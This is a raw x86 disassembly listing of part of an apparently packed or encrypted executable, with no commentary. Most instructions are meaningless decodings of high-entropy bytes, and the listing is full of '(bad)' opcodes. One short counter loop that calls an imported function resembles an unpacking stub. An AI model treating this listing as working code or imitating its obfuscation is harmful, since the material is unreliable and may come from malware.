  409f60:	outs   dx,BYTE PTR ds:[esi]
  409f61:	sub    eax,0x4e031550
  409f66:	repz shr bh,1
  409f69:	push   edi
  409f6a:	push   edx
  409f6b:	push   esp
  409f6c:	aad    0x6e
  409f6e:	pop    esi
  409f6f:	xchg   ecx,eax
  409f70:	adc    DWORD PTR [esi+0x577de78c],edx
  409f76:	js     0x409fa1
  409f78:	fyl2x  
  409f7a:	test   DWORD PTR [esi-0x15054fba],edi
  409f80:	sbb    dl,0x42
  409f83:	pop    esp
  409f84:	push   es
  409f85:	scas   eax,DWORD PTR es:[edi]
  409f86:	mov    eax,ds:0x6b04be24
  409f8b:	in     eax,0xd7
  409f8d:	xchg   ebx,eax
  409f8e:	test   eax,0x5c81f0f4
  409f93:	ins    BYTE PTR es:[edi],dx
  409f94:	int    0xb4
  409f96:	jno    0x409f5d
  409f98:	xor    eax,0x322436e
  409f9d:	sbb    eax,DWORD PTR [ebx+0x3f]
  409fa0:	leave  
  409fa1:	add    DWORD PTR [eax-0x384c94b9],esi
  409fa7:	pop    ecx
  409fa8:	aam    0xe4
  409faa:	mov    edx,0x486948d8
  409faf:	fisttp QWORD PTR [ebx]
  409fb1:	xchg   ebx,eax
  409fb2:	add    al,0x63
  409fb4:	adc    eax,0x9d3d4b3d
  409fb9:	sbb    al,0x32
  409fbb:	and    eax,0x67d45e6c
  409fc0:	push   esp
  409fc1:	dec    BYTE PTR [edi+0x35]
  409fc4:	out    dx,al
  409fc5:	jb     0x40a019
  409fc7:	(bad)  
  409fc8:	lea    ebp,[esp+ebp*8-0x2c]
  409fcc:	jmp    0x40a014
  409fce:	push   0xffffffaf
  409fd0:	or     ebp,ecx
  409fd2:	sbb    ch,al
  409fd4:	ror    DWORD PTR [ecx+0x64],cl
  409fd7:	pop    ecx
  409fd8:	mov    WORD PTR [eax+0x57c2226b],fs
  409fde:	in     al,0x9a
  409fe0:	adc    DWORD PTR [esi-0x49],esi
  409fe3:	add    DWORD PTR ds:0xb8b3727,edi
  409fe9:	add    eax,0x7b8b13a0
  409fee:	inc    esi
  409fef:	cmp    ch,BYTE PTR [esi]
  409ff1:	aas    
  409ff2:	xchg   ebx,eax
  409ff4:	inc    ecx
  409ff5:	adc    ecx,DWORD PTR [eax+0x46]
  409ff8:	cmp    al,al
  409ffa:	fld    TBYTE PTR [esi+ecx*8]
  409ffd:	pushf  
  409ffe:	addr16 hlt 
  40a000:	add    edx,DWORD PTR [ecx]
  40a002:	clc    
  40a003:	adc    eax,esi
  40a005:	rcr    BYTE PTR [eax],1
  40a007:	jecxz  0x40a01c
  40a009:	fsubr  DWORD PTR [edx+ebp*2+0x47b2270]
  40a010:	sbb    al,0x2c
  40a012:	stc    
  40a013:	in     eax,0xb5
  40a015:	add    ebx,ecx
  40a017:	adc    ch,BYTE PTR [esi]
  40a019:	inc    edi
  40a01a:	sub    bh,ch
  40a01c:	pop    ebp
  40a01d:	jmp    0xabc3:0x13954904
  40a024:	push   ebx
  40a025:	nop
  40a026:	imul   eax,ebx,0x1e7a873f
  40a02c:	enter  0xbf1b,0x30
  40a030:	push   ss
  40a031:	push   esi
  40a032:	xchg   edi,eax
  40a033:	loop   0x409fbe
  40a035:	adc    BYTE PTR [ecx],0xe2
  40a038:	mov    dl,0x79
  40a03a:	aas    
  40a03b:	adc    BYTE PTR [ebp-0x19],0x5c
  40a03f:	sbb    al,0x71
  40a041:	scas   al,BYTE PTR es:[edi]
  40a042:	je     0x40a03a
  40a044:	and    esi,ebx
  40a046:	mov    edx,0xd43ce869
  40a04c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40a04e:	loopne 0x40a008
  40a050:	dec    edi
  40a051:	inc    edi
  40a052:	mov    ds:0x927c4165,al
  40a057:	pusha  
  40a058:	sbb    eax,DWORD PTR [ecx]
  40a05a:	push   es
  40a05b:	xor    al,0x29
  40a05d:	dec    esp
  40a05e:	cmp    edi,DWORD PTR [ecx]
  40a060:	push   0x32d14932
  40a065:	pop    eax
  40a066:	(bad)  
  40a067:	imul   eax,DWORD PTR [eax-0x64],0xd34c50e6
  40a06e:	in     al,0xce
  40a070:	rcr    DWORD PTR [edx-0x3aee2b1c],cl
  40a076:	add    edi,DWORD PTR [edi-0x80]
  40a079:	jne    0x40a01b
  40a07b:	sbb    esi,edx
  40a07d:	xchg   esp,eax
  40a07e:	out    dx,eax
  40a07f:	dec    eax
  40a080:	lahf   
  40a081:	mov    WORD PTR [ecx-0x44b3a44d],ss
  40a087:	sbb    al,0x7a
  40a089:	xchg   DWORD PTR [ebx+0x59],ebx
  40a08c:	ret    0xa5d3
  40a08f:	test   BYTE PTR [edx+0x3b0c5021],bh
  40a095:	les    ebp,FWORD PTR [eax-0x33]
  40a098:	ret    0x17c
  40a09b:	ffreep st(1)
  40a09d:	sbb    BYTE PTR [ebx+0x66c7c79c],dl
  40a0a3:	bound  edx,QWORD PTR [edx+0x46092728]
  40a0a9:	dec    ebx
  40a0aa:	mov    edi,0x4106a5c4
  40a0af:	scas   al,BYTE PTR es:[edi]
  40a0b0:	into   
  40a0b1:	mov    DWORD PTR [edx-0x644545fe],ebx
  40a0b7:	add    BYTE PTR ds:0x91adca53,dh
  40a0bd:	pusha  
  40a0be:	mov    edx,0x7901f71b
  40a0c3:	sbb    dh,BYTE PTR [edi-0x26e3219]
  40a0c9:	inc    ecx
  40a0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0cb:	adc    eax,0xc02c6e88
  40a0d0:	adc    BYTE PTR [edx+0x3c],dl
  40a0d3:	sbb    edx,ebx
  40a0d5:	dec    edi
  40a0d6:	(bad)  
  40a0d7:	das    
  40a0d8:	jp     0x40a0a2
  40a0da:	jne    0x40a0b0
  40a0dc:	sub    esp,DWORD PTR [eax-0x2541ea9]
  40a0e2:	mov    esi,0x43158dcb
  40a0e7:	mov    eax,ds:0x9d5ef076
  40a0ec:	inc    ebp
  40a0ed:	(bad)
  40a0f0:	mov    edi,0xf3448a7d
  40a0f5:	xchg   esp,eax
  40a0f6:	int    0x3
  40a0f8:	dec    BYTE PTR [edi-0x1564a79d]
  40a0fe:	dec    ebp
  40a0ff:	lahf   
  40a100:	pop    es
  40a101:	and    ecx,DWORD PTR [esi]
  40a103:	stos   DWORD PTR es:[edi],eax
  40a104:	jo     0x40a120
  40a106:	test   al,0xc4
  40a108:	js     0x40a121
  40a10a:	inc    esp
  40a10b:	cmp    BYTE PTR [edi+0x1d],bl
  40a10e:	retf   0xd863
  40a111:	jae    0x40a097
  40a113:	mov    eax,0xa6f1c4a
  40a118:	xchg   ebx,eax
  40a119:	mov    al,ds:0xe87d1006
  40a11e:	push   esp
  40a11f:	repnz or esp,DWORD PTR [edi]
  40a122:	ja     0x40a0d3
  40a124:	sbb    ecx,DWORD PTR [eax]
  40a126:	or     dl,BYTE PTR [edi]
  40a128:	imul   ebp,DWORD PTR [edx-0x56943982],0xb92ad6ab
  40a132:	stc    
  40a133:	fld    DWORD PTR [ebx-0x69b87115]
  40a139:	xchg   edi,eax
  40a13a:	and    dl,BYTE PTR cs:[ebp+eiz*4+0x71]
  40a13f:	shl    BYTE PTR [edx+0x58],0x47
  40a143:	xchg   esi,eax
  40a144:	xor    dl,BYTE PTR ds:0x18fd20cc
  40a14a:	fcmovb st,st(5)
  40a14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a14d:	not    edx
  40a14f:	jle    0x40a18b
  40a151:	outs   dx,BYTE PTR ds:[esi]
  40a152:	pop    ss
  40a153:	jb     0x40a165
  40a155:	mov    esi,0x54c589b1
  40a15a:	sbb    DWORD PTR [esi],ebp
  40a15c:	lea    edi,[edi]
  40a15e:	cmp    eax,0xd99acec2
  40a163:	lds    eax,FWORD PTR [ebx+esi*8+0x33]
  40a167:	(bad)  
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	jp     0x40a13f
  40a17b:	inc    BYTE PTR [edx+0x39]
  40a17e:	out    0x7e,eax
  40a180:	jle    0x40a1b0
  40a182:	jge    0x40a202
  40a184:	jle    0x40a1e5
  40a186:	jmp    0x6a72c569
  40a18b:	dec    esi
  40a18c:	fucomp st(1)
  40a18e:	sub    dl,cl
  40a190:	mov    eax,0xdb54630d
  40a195:	lahf   
  40a196:	jmp    0xd9a1401c
  40a19b:	stc    
  40a19c:	std    
  40a19d:	fs jo  0x40a15c
  40a1a0:	stc    
  40a1a1:	lods   eax,DWORD PTR ds:[esi]
  40a1a2:	cmc    
  40a1a3:	imul   edi,DWORD PTR [esi],0x33
  40a1a6:	push   0x72
  40a1a8:	adc    al,0x10
  40a1aa:	je     0x40a1dc
  40a1ac:	push   0xb45124d4
  40a1b1:	sub    BYTE PTR [esi],cl
  40a1b3:	repnz xchg ebp,eax
  40a1b5:	pop    es
  40a1b6:	cmp    eax,0x1740dbf0
  40a1bb:	jbe    0x40a150
  40a1bd:	enter  0xef,0x50
  40a1c1:	pop    edx
  40a1c2:	cmp    BYTE PTR [edx+0x7b243642],ah
  40a1c8:	das    
  40a1c9:	daa    
  40a1ca:	mov    dl,0x13
  40a1cc:	es (bad) 
  40a1ce:	push   dx
  40a1d0:	std    
  40a1d1:	(bad)  
  40a1d2:	aam    0xb1
  40a1d4:	jg     0x40a159
  40a1d6:	xor    al,0x99
  40a1d8:	push   ebp
  40a1d9:	mov    ?,WORD PTR ss:[edi-0x76a2b025]
  40a1e0:	nop
  40a1e1:	std    
  40a1e2:	test   cl,bh
  40a1e4:	loop   0x40a1bf
  40a1e6:	repnz pop ebp
  40a1e8:	adc    esp,DWORD PTR [eax-0x29]
  40a1eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1ec:	cli    
  40a1ed:	shl    BYTE PTR [edi-0x44],0xcf
  40a1f1:	add    edx,DWORD PTR [edi]
  40a1f3:	pop    esi
  40a1f4:	mov    BYTE PTR [ebp+0x7a63ad4b],bh
  40a1fa:	jp     0x40a19a
  40a1fc:	in     eax,0x1a
  40a1fe:	inc    eax
  40a1ff:	daa    
  40a200:	push   eax
  40a201:	xor    ah,BYTE PTR [ecx]
  40a203:	es dec esi
  40a205:	imul   ecx,DWORD PTR [esi],0x1b
  40a208:	push   es
  40a209:	sbb    eax,0x14c233bc
  40a20e:	addr16 leave 
  40a210:	and    edi,DWORD PTR [ebx-0x7e]
  40a213:	xor    al,0x60
  40a215:	fmul   DWORD PTR gs:[edi]
  40a218:	outs   dx,BYTE PTR ds:[esi]
  40a219:	je     0x40a295
  40a21b:	mov    ebx,0x9fb8b5a7
  40a220:	xchg   DWORD PTR ds:0x75c7fb61,esp
  40a226:	add    al,BYTE PTR [ecx-0xac8f432]
  40a22c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a22d:	cwde   
  40a22e:	or     DWORD PTR ds:0xc743e7e4,esi
  40a234:	(bad)  
  40a235:	pusha  
  40a236:	mov    ds:0xb836d8b3,al
  40a23b:	js     0x40a220
  40a23d:	push   ecx
  40a23e:	(bad)  
  40a23f:	adc    esp,DWORD PTR [ecx+ebp*2+0x45]
  40a243:	sbb    al,0x65
  40a245:	out    0x1b,eax
  40a247:	rcl    dh,cl
  40a249:	push   es
  40a24a:	(bad)  
  40a24b:	xchg   ecx,eax
  40a24c:	stc    
  40a24d:	nop    edx
  40a250:	int3   
  40a251:	jbe    0x40a1e1
  40a253:	aaa    
  40a254:	push   esp
  40a255:	xor    eax,0x73e0c376
  40a25a:	dec    esp
  40a25b:	adc    ah,BYTE PTR [edx+0x7a3b20fe]
  40a261:	sub    ch,BYTE PTR [edi]
  40a263:	adc    eax,eax
  40a265:	and    al,0xca
  40a267:	test   al,0x70
  40a269:	xchg   DWORD PTR ds:0x4cb28a06,edi
  40a26f:	inc    edx
  40a270:	(bad)  
  40a271:	mov    ebp,0x956ce745
  40a276:	pop    ss
  40a277:	sub    BYTE PTR ds:0x6b3b,dl
  40a27c:	mov    eax,0x89427626
  40a281:	ss xor bh,bl
  40a284:	(bad)  
  40a285:	or     ebp,ebx
  40a287:	arpl   WORD PTR [esi],dx
  40a289:	dec    esi
  40a28a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a28b:	xor    ecx,ecx
  40a28d:	sbb    eax,0xe0104b2c
  40a292:	fmul   DWORD PTR [edi+0x78]
  40a295:	mov    ebp,0xecb0cc90
  40a29a:	loop   0x40a295
  40a29c:	(bad)  
  40a29d:	fwait
  40a29e:	jbe    0x40a29f
  40a2a0:	mov    ah,0x37
  40a2a2:	pop    ebx
  40a2a3:	(bad)  
  40a2a4:	scas   al,BYTE PTR es:[edi]
  40a2a5:	pop    esp
  40a2a6:	stos   BYTE PTR es:[edi],al
  40a2a7:	cmp    eax,0x31c62c7c
  40a2ac:	test   BYTE PTR [eax],dl
  40a2ae:	push   ss
  40a2af:	loope  0x40a2b8
  40a2b1:	les    esp,FWORD PTR [esi+0x76ba6788]
  40a2b7:	jge    0x40a334
  40a2b9:	scas   al,BYTE PTR es:[edi]
  40a2ba:	out    dx,eax
  40a2bb:	xor    BYTE PTR [esi+0x2f],ah
  40a2be:	pop    ebp
  40a2bf:	sbb    eax,0x5a5528ff
  40a2c4:	sub    BYTE PTR [edx+eax*2],dl
  40a2c7:	cmp    BYTE PTR [esi+esi*2],cl
  40a2ca:	pop    esp
  40a2cb:	int3   
  40a2cc:	and    BYTE PTR [esi+0x195ddc08],dh
  40a2d2:	test   eax,0x6c99140
  40a2d7:	rcl    BYTE PTR [edx],1
  40a2d9:	popf   
  40a2da:	jae    0x40a2d9
  40a2dc:	das    
  40a2dd:	mov    ebx,0x1459ffb9
  40a2e2:	rcr    BYTE PTR [ebx],cl
  40a2e4:	and    al,0x9d
  40a2e6:	jg     0x40a2ed
  40a2e8:	fs adc eax,0xb0a3736f
  40a2ee:	cmp    DWORD PTR [ebx-0x238e37a0],ebx
  40a2f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2f5:	push   0xf7b2265d
  40a2fa:	ss stos BYTE PTR es:[edi],al
  40a2fc:	mov    ds:0x4edab41a,al
  40a301:	rcl    BYTE PTR [esi-0x7d],cl
  40a304:	not    DWORD PTR [edi-0x76dc972f]
  40a30a:	fwait
  40a30b:	jg     0x40a301
  40a30d:	ret    
  40a30e:	pop    esi
  40a30f:	stos   DWORD PTR es:[edi],eax
  40a310:	mov    ds:0x6a1bdc78,eax
  40a315:	dec    ebp
  40a316:	or     al,0x94
  40a318:	ins    DWORD PTR es:[edi],dx
  40a319:	cli    
  40a31a:	retf   0xb99b
  40a31d:	jecxz  0x40a2e6
  40a31f:	push   edi
  40a320:	jbe    0x40a3a1
  40a322:	add    DWORD PTR [ebp-0x54],edi
  40a325:	aam    0x74
  40a327:	scas   eax,DWORD PTR es:[edi]
  40a328:	leave  
  40a329:	stos   BYTE PTR es:[edi],al
  40a32a:	jne    0x40a3a2
  40a32c:	cmp    al,0xfc
  40a32e:	dec    edi
  40a32f:	jo     0x40a3aa
  40a331:	std    
  40a332:	sbb    DWORD PTR [edi+0x4ecb344b],ecx
  40a338:	aas    
  40a339:	mov    cl,0xe3
  40a33b:	or     ch,dl
  40a33d:	jge    0x40a2fb
  40a33f:	xchg   ebx,eax
  40a340:	sub    al,0x9
  40a342:	scas   eax,DWORD PTR es:[edi]
  40a343:	xchg   esp,eax
  40a344:	stos   DWORD PTR es:[edi],eax
  40a345:	test   ebx,ebx
  40a347:	xchg   BYTE PTR [eax+0x59],dh
  40a34a:	xchg   DWORD PTR [edx+0x7282a7a4],ebp
  40a350:	hlt    
  40a351:	pop    ebp
  40a352:	mov    ebx,0xbf2cc6b1
  40a357:	fcmovu st,st(6)
  40a359:	fs ret 
  40a35b:	stos   DWORD PTR es:[edi],eax
  40a35c:	jge    0x40a387
  40a35e:	add    ah,bl
  40a360:	retf   
  40a361:	and    ebp,DWORD PTR [edi+eiz*8+0x5763361e]
  40a368:	pushf  
  40a369:	cmp    al,0x35
  40a36b:	pop    ss
  40a36c:	mov    dh,0xd2
  40a36e:	into   
  40a36f:	xchg   ebx,eax
  40a370:	int    0xec
  40a372:	jmp    0x2967c77b
  40a377:	test   eax,0x16c7fbf9
  40a37c:	mov    ecx,0xd2173e0e
  40a381:	std    
  40a382:	dec    DWORD PTR [edi-0x558002d]
  40a388:	push   es
  40a389:	pushf  
  40a38a:	and    al,0x5b
  40a38c:	and    al,0xad
  40a38e:	dec    ebx
  40a38f:	arpl   WORD PTR [ebx-0x12],cx
  40a392:	push   ebp
  40a393:	sub    eax,0xa1cfafd2
  40a398:	(bad)  
  40a399:	lock cld 
  40a39b:	and    DWORD PTR [ecx-0x64],ebx
  40a39e:	jno    0x40a320
  40a3a0:	xor    BYTE PTR [edi+0x1b6ad05a],bh
  40a3a6:	and    eax,edx
  40a3a8:	xor    bh,al
  40a3aa:	xlat   BYTE PTR ds:[ebx]
  40a3ab:	call   0x44d63b78
  40a3b0:	dec    edi
  40a3b1:	add    cl,BYTE PTR [eax+0x50]
  40a3b4:	cwde   
  40a3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3b6:	mov    al,ds:0xe18bf09d
  40a3bb:	dec    esp
  40a3bc:	mov    cl,bh
  40a3be:	xor    eax,DWORD PTR [eax]
  40a3c0:	out    0xd7,eax
  40a3c2:	lods   al,BYTE PTR ds:[esi]
  40a3c3:	cmp    dh,BYTE PTR [ecx]
  40a3c5:	imul   edi,DWORD PTR [eax+0x22965ecc],0xffffffbb
  40a3cc:	sbb    BYTE PTR [ecx+0x71],cl
  40a3cf:	cli    
  40a3d0:	sti    
  40a3d1:	or     edx,ecx
  40a3d3:	mov    bl,0x97
  40a3d5:	sar    DWORD PTR [ebx-0x4838c756],0x3f
  40a3dc:	add    eax,0xb0ddf282
  40a3e1:	popa   
  40a3e2:	test   BYTE PTR [esi+eax*4],0x11
  40a3e6:	add    DWORD PTR [esi-0x1fb4a5e9],ecx
  40a3ec:	and    DWORD PTR [eax-0x5b],edx
  40a3ef:	popa   
  40a3f0:	ins    BYTE PTR es:[edi],dx
  40a3f1:	xchg   edx,eax
  40a3f2:	cmp    al,0xf9
  40a3f4:	cwde   
  40a3f5:	push   ecx
  40a3f6:	sbb    dl,BYTE PTR [ebp-0x685ac324]
  40a3fc:	repnz test al,0x80
  40a3ff:	add    dl,dh
  40a401:	loop   0x40a459
  40a403:	mov    ds:0x613bcee6,al
  40a408:	sbb    al,0x14
  40a40a:	int    0x76
  40a40c:	inc    esi
  40a40d:	add    cl,bh
  40a40f:	xchg   DWORD PTR gs:[ebx+esi*2-0x28c05e49],edi
  40a417:	mov    esi,DWORD PTR [edi]
  40a419:	push   0x8a974a2c
  40a41e:	stos   BYTE PTR es:[edi],al
  40a41f:	test   DWORD PTR [ebp+0x1c],eax
  40a422:	jno    0x40a3d0
  40a424:	push   edi
  40a425:	pop    ss
  40a426:	adc    eax,0xf8fd5fb6
  40a42b:	lods   eax,DWORD PTR ds:[esi]
  40a42c:	xlat   BYTE PTR ds:[ebx]
  40a42d:	mov    ah,0x11
  40a42f:	and    dl,BYTE PTR [ebx+eax*2-0x15]
  40a433:	cld    
  40a434:	dec    ebx
  40a435:	lock jmp 0x504416ea
  40a43b:	mov    ebp,0x184d3bd1
  40a440:	mov    ebp,0x1d39d4f0
  40a445:	sbb    al,0xa1
  40a447:	sti    
  40a448:	les    esp,FWORD PTR [ebp+0xd]
  40a44b:	int3   
  40a44c:	call   0xf541:0x2059af0b
  40a453:	jl     0x40a3f2
  40a455:	out    dx,eax
  40a456:	mov    al,ds:0xca1a1323
  40a45b:	mov    ebp,ebp
  40a45d:	leave  
  40a45e:	cmp    DWORD PTR [ebx+0x17a500cc],ecx
  40a464:	stc    
  40a465:	mov    al,ds:0x15a4c8c9
  40a46a:	sub    BYTE PTR ss:[ebx],al
  40a46d:	scas   al,BYTE PTR es:[edi]
  40a46e:	cdq    
  40a46f:	push   esi
  40a470:	pop    ebp
  40a471:	adc    DWORD PTR [esi],ebx
  40a473:	push   0x29b486b5
  40a478:	sub    DWORD PTR [eax],ebx
  40a47a:	ficom  WORD PTR ds:[ecx+0x4]
  40a47e:	jle    0x40a437
  40a480:	mov    eax,ds:0x85648f31
  40a485:	pusha  
  40a486:	ret    0x6adb
  40a489:	adc    BYTE PTR [ebx+ecx*8+0x461eed45],bl
  40a490:	popa   
  40a491:	push   0x269ba78f
  40a496:	push   ebx
  40a497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a498:	sub    eax,0x29ff2bbe
  40a49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a49e:	fmulp  st(5),st
  40a4a0:	jl     0x40a453
  40a4a2:	pxor   mm3,mm4
  40a4a5:	push   0xffffffed
  40a4a7:	mov    eax,ds:0xb1659c2e
  40a4ac:	inc    edx
  40a4ad:	daa    
  40a4ae:	mov    dh,0x5c
  40a4b0:	mov    dh,0xdf
  40a4b2:	cmp    cl,BYTE PTR [esi]
  40a4b4:	inc    ebx
  40a4b5:	add    eax,edi
  40a4b7:	and    DWORD PTR ds:0x430471,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x430471
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x430471,ebx
  40a4d0:	cmp    DWORD PTR ds:0x430471,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42ec3b
  40a4e8:	cmp    DWORD PTR ds:0x430471,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	xchg   BYTE PTR ss:[ebx+edi*1+0xb],ah
  40a515:	jmp    0x2ebf23fc
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a589
  40a51e:	push   0xc1a634b1
  40a523:	jle    0x40a4fd
  40a525:	(bad)  
  40a526:	mov    ah,0x9c
  40a528:	inc    esi
  40a529:	push   edx
  40a52a:	and    dh,ah
  40a52c:	out    dx,eax
  40a52d:	add    bh,BYTE PTR [edx]
  40a52f:	sbb    al,0x4d
  40a531:	imul   ebx,DWORD PTR [ebx+0x31],0x1125ffb4
  40a538:	mov    BYTE PTR [ebp+0x4f],al
  40a53b:	retf   
  40a53c:	je     0x40a531
  40a53e:	xchg   edi,eax
  40a53f:	(bad)  
  40a540:	gs dec esi
  40a542:	mov    esi,0xc6bbc642
  40a547:	add    edx,DWORD PTR [esi+0x38]
  40a54a:	jle    0x40a576
  40a54c:	xchg   esi,eax
  40a54d:	xchg   ecx,eax
  40a54e:	stc    
  40a54f:	lods   eax,DWORD PTR ds:[esi]
  40a550:	inc    eax
  40a551:	das    
  40a552:	cmp    bh,dl
  40a554:	outs   dx,BYTE PTR ds:[esi]
  40a555:	inc    esp
  40a556:	ret    
  40a557:	pop    ebx
  40a558:	jbe    0x40a5a7
  40a55a:	jle    0x40a574
  40a55c:	xchg   dl,cl
  40a55e:	ret    0x58f1
  40a561:	xchg   esp,eax
  40a562:	aad    0xbb
  40a564:	adc    eax,0x2f1a21ea
  40a569:	call   0x9c26:0x102c71d3
  40a570:	out    dx,eax
  40a571:	fild   DWORD PTR [esi-0x6a7e0c11]
  40a577:	xchg   ebx,eax
  40a578:	cmp    bh,cl
  40a57a:	push   eax
  40a57b:	stos   DWORD PTR es:[edi],eax
  40a57c:	in     eax,0xd1
  40a57e:	inc    edx
  40a57f:	dec    ecx
  40a580:	add    al,BYTE PTR [ebp-0x5f]
  40a583:	adc    ebx,DWORD PTR ds:0xe09a664d
  40a589:	aas    
  40a58a:	frstor [edi+0x10]
  40a58d:	int    0xaf
  40a58f:	int3   
  40a590:	neg    BYTE PTR [ebp+ecx*1-0x53f8cfab]
  40a597:	mov    ch,0xa7
  40a599:	repnz iret 
  40a59b:	mov    esp,0x8c48d21
  40a5a0:	sahf   
  40a5a1:	mov    esp,0xd6f0b273
  40a5a6:	fs push es
  40a5a8:	das    
  40a5a9:	outs   dx,BYTE PTR ds:[esi]
  40a5aa:	jae    0x40a598
  40a5ac:	rol    DWORD PTR [edi],1
  40a5ae:	cmp    ecx,ecx
  40a5b0:	jge    0x40a557
  40a5b2:	push   es
  40a5b3:	adc    DWORD PTR [edi],edx
  40a5b5:	adc    al,0xf5
  40a5b7:	sub    al,0x28
  40a5b9:	test   DWORD PTR [edi-0x6e3b2f3b],ecx
  40a5bf:	dec    edx
  40a5c0:	(bad)  
  40a5c1:	clc    
  40a5c2:	mov    edx,0x9da59fbf
  40a5c7:	xor    esp,DWORD PTR [esi]
  40a5c9:	add    bh,BYTE PTR [eax+ecx*4+0x1cdbcd73]
  40a5d0:	add    ecx,DWORD PTR [edx+0x4a]
  40a5d3:	sbb    eax,edi
  40a5d5:	sbb    edx,esp
  40a5d7:	std    
  40a5d8:	stos   DWORD PTR es:[edi],eax
  40a5d9:	pop    es
  40a5da:	push   edi
  40a5db:	(bad)  
  40a5dc:	and    BYTE PTR [ebx],dl
  40a5de:	mov    BYTE PTR [edx+0x6ef0d665],al
  40a5e4:	ins    BYTE PTR es:[edi],dx
  40a5e5:	xor    DWORD PTR [edx-0x4fa10667],0x26df205d
  40a5ef:	or     bl,al
  40a5f1:	jle    0x40a578
  40a5f3:	aaa    
  40a5f4:	xchg   ecx,eax
  40a5f5:	mov    bl,0x94
  40a5f7:	jl     0x40a5d8
  40a5f9:	nop
  40a5fa:	lods   eax,DWORD PTR ds:[esi]
  40a5fb:	sub    eax,0x52bf7360
  40a600:	repz sub eax,0x407191ac
  40a606:	adc    edx,0xb69d39b3
  40a60c:	push   ebp
  40a60d:	outs   dx,BYTE PTR ds:[esi]
  40a60e:	push   edx
  40a60f:	repnz out 0x1c,eax
  40a612:	std    
  40a613:	jl     0x40a634
  40a615:	xchg   ebp,eax
  40a616:	and    dh,BYTE PTR [edi]
  40a618:	lock dec ebx
  40a61a:	nop
  40a61b:	in     eax,dx
  40a61c:	sar    DWORD PTR [ecx-0x1e],cl
  40a61f:	xor    BYTE PTR [edi],bh
  40a621:	pop    ecx
  40a622:	mov    bh,0x23
  40a624:	add    al,bh
  40a626:	popa   
  40a627:	imul   ebx,ebp,0x58
  40a62a:	ss shl edi,cl
  40a62d:	test   DWORD PTR [ebx-0x24984006],edx
  40a633:	nop
  40a634:	arpl   sp,ax
  40a636:	(bad)  
  40a637:	(bad)  
  40a638:	idiv   BYTE PTR [eax+0x71]
  40a63b:	jge    0x40a612
  40a63d:	mov    eax,ds:0x14504604
  40a642:	pop    es
  40a643:	pop    edi
  40a644:	inc    ecx
  40a645:	dec    edx
  40a646:	icebp  
  40a647:	nop
  40a648:	shl    BYTE PTR [esi-0x29],0xa8
  40a64c:	mov    bl,0xbf
  40a64e:	mov    edx,0x2f07ec4a
  40a653:	sti    
  40a654:	sbb    ecx,DWORD PTR ds:0xf681a30f
  40a65a:	sbb    DWORD PTR [edi+0x61],0x6f8a7d29
  40a661:	xlat   BYTE PTR ds:[ebx]
  40a662:	xchg   esi,eax
  40a663:	xchg   edx,eax
  40a664:	iret   
  40a665:	fwait
  40a666:	adc    ecx,ebx
  40a668:	pop    ecx
  40a669:	stc    
  40a66a:	or     DWORD PTR [edi+0x49ccff82],0x23bf554a
  40a674:	cdq    
  40a675:	dec    eax
  40a676:	xlat   BYTE PTR ds:[ebx]
  40a677:	xor    eax,0x3ddfca6c
  40a67c:	div    al
  40a67e:	dec    ebx
  40a67f:	sti    
  40a680:	and    eax,0xe7b23e29
  40a685:	ins    BYTE PTR es:[edi],dx
  40a686:	jmp    0x59d2be74
  40a68b:	mov    ah,0xd6
  40a68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a68e:	pop    edi
  40a68f:	(bad)  
  40a690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a691:	(bad)  
  40a692:	cli    
  40a693:	popa   
  40a694:	cwde   
  40a695:	out    0xf9,al
  40a697:	adc    BYTE PTR [eax+edx*2-0x7c1b3e4e],0x92
  40a69f:	fwait
  40a6a0:	stos   BYTE PTR es:[edi],al
  40a6a1:	mov    ch,0xed
  40a6a3:	ins    DWORD PTR es:[edi],dx
  40a6a4:	jmp    0x4675:0x905639d3
  40a6ab:	ret    0xf383
  40a6ae:	jmp    DWORD PTR [ebp-0xde077ea]
  40a6b4:	icebp  
  40a6b5:	push   ss
  40a6b6:	or     BYTE PTR [edx+0x4c],al
  40a6b9:	dec    ebp
  40a6ba:	or     DWORD PTR [edx-0x3],0x680ffaf8
  40a6c1:	push   esp
  40a6c2:	cmp    esp,DWORD PTR [ecx]
  40a6c4:	icebp  
  40a6c5:	add    cl,bh
  40a6c7:	sbb    DWORD PTR [esi],0x6
  40a6ca:	stos   BYTE PTR es:[edi],al
  40a6cb:	data16 add BYTE PTR [eax-0x1a],0x41
  40a6d0:	jmp    0x5b80:0xf564
  40a6d6:	leave  
  40a6d7:	loop   0x40a723
  40a6d9:	imul   edi,edx,0xffffff8e
  40a6dc:	aam    0xec
  40a6de:	and    ch,BYTE PTR [edi]
  40a6e0:	fdivr  DWORD PTR [edx+0x57d5875c]
  40a6e6:	inc    edx
  40a6e7:	mov    ebx,0xf2b6c4f1
